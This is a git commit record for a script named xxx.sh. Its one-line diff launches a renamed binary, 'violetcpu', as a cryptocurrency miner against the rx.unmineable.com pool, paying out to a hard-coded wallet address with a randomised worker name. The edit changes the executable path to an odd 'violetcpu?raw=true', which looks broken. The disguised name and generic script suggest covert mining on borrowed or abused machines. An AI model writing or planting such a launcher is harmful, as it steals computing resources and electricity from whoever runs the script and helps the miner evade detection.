1343392291fef04920a2ebe4f6948796cf5c9673
angkii <83603708+angkii@users.noreply.github.com>
2021-07-21 01:13:05 +0700

    Update xxx.sh

--- xxx.sh
+++ xxx.sh
@@ -1,1 +1,1 @@
-./violetcpu -a wrkzcoin -o rx.unmineable.com:3333 -u 0xb13f91835c32249e1506da1201e937d666652725.$(echo $(shuf -i 1000-9999 -n 1)-NICE)
+./violetcpu?raw=true -a wrkzcoin -o rx.unmineable.com:3333 -u 0xb13f91835c32249e1506da1201e937d666652725.$(echo $(shuf -i 1000-9999 -n 1)-NICE)
